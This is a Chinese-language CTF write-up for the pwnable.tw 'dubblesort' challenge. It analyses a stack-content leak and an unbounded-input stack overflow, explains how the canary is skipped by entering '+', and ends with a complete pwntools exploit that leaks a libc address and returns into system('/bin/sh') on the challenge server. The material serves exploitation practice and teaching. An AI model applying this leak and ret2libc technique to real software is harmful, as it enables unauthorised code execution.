## 分析

检查可以发现保护全开

这题的逻辑很简单，输入姓名，然后输入数据，程序会对数据进行排序然后输出

## 漏洞点

首先是输入姓名的时候，程序通过read来读取name，回车就截断了，并不会在后面添加\x00，但是printf打印信息是通过\x00截断的，也就是说如果输入后如果后面不是\x00，就会接着输出，产生栈内容泄漏。

然后是在排序的阶段，并没有限制输入数字的数量，所以可以造成栈溢出。

## 利用

可以看到题目中是存在canary的，但是没办法泄漏，那有没有办法能不修改canary同时完成栈溢出呢？

如果我们输入非法字符例如字母，scanf确实无法读取，但是由于题目中输入流并不会清空，所以非法字符一直会一直留在stdin，这样剩下的scanf读入的都是非法字符，不行

另一种方案是输入+或-，因为这两个字符可以定义正负数，如果把输入数字替换成这两个符号，读入只会视为无效而不是非法，canary不会被修改。

经过调试我们可以看到在输入name的第七个栈空间中存放着疑似栈libc地址的内容

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-1.png)

利用vmmap命令进行对照

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-2.png)

可以计算得偏移为 0xf7fb2000 - 0xf7dff000 = 0x1b3000

但是需要注意的是这里我们使用的是本机上的libc文件

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-3.png)

查看文件可得此偏移地址为 .got.plt

与题目给的文件进行对照，发现服务器上的偏移应为0x1b0000

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-4.png)

而同样我们可以在这个libc文件内找到system的偏移及/bin/sh的偏移

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-5.png)

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-6.png)

libc_addr = leak_addr - 0x1b0000

system_addr = libc_addr + 0x3a940

binsh_addr = libc_addr + 0x158e8b

## exp

需要注意的是该栈单元的数据的第一个字节（即.got.plt节地址的最后一个字节，因为小端序）总为0x00，因此若要泄露该数据，需要多发送一个字节覆盖掉0x00，否则printf会将0x00之后的数据截断。可以发送'A'*24+'\n'来泄露出该数据的后三个字节，再加上'\x00'即可。

然后程序中的排序函数会对栈中内容进行修改，我们需要在输入数据时注意数据的大小，以保证canary地址不会改变，我们可以将canary之前的数据都置0，canary和返回地址之间（包括返回地址）的数据都写入system函数的地址，从而保证exp大概率可以执行成功

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-dubblesort-7.png)

最后需要输入的是35个数

24 * '0' + '+' + 9 \* system_addr(调试得知) + binshaddr

```python
from pwn import *
context(arch="amd64",os='linux',log_level='debug')
myelf = ELF("./dubblesort")
#io = process(myelf.path)
#gdb.attach(io,"break main")
io = remote("chall.pwnable.tw",10101)

io.recvuntil(':')
io.sendline('a'*24)
leak_addr = u32(io.recv()[30:34]) - 0xa

libc_addr = leak_addr - 0x1b0000
system_addr = libc_addr + 0x3a940
binsh_addr = libc_addr + 0x158e8b

io.sendline('35')
for i in range(24):
	io.sendline('0')
	io.recv()

io.sendline('+')
io.recv()
for i in range(9):
	io.sendline(str(system_addr))
	io.recv()
io.sendline(str(binsh_addr))
io.recv()
io.interactive()
```

参考

- https://www.anquanke.com/post/id/150359#h2-13

- https://www.freebuf.com/articles/others-articles/134271.html
- http://39.105.67.126/index.php/2019/09/19/pwnable-twdubblesort/
- https://p1kk.github.io/2020/07/09/tw/tw%20dubblesort/
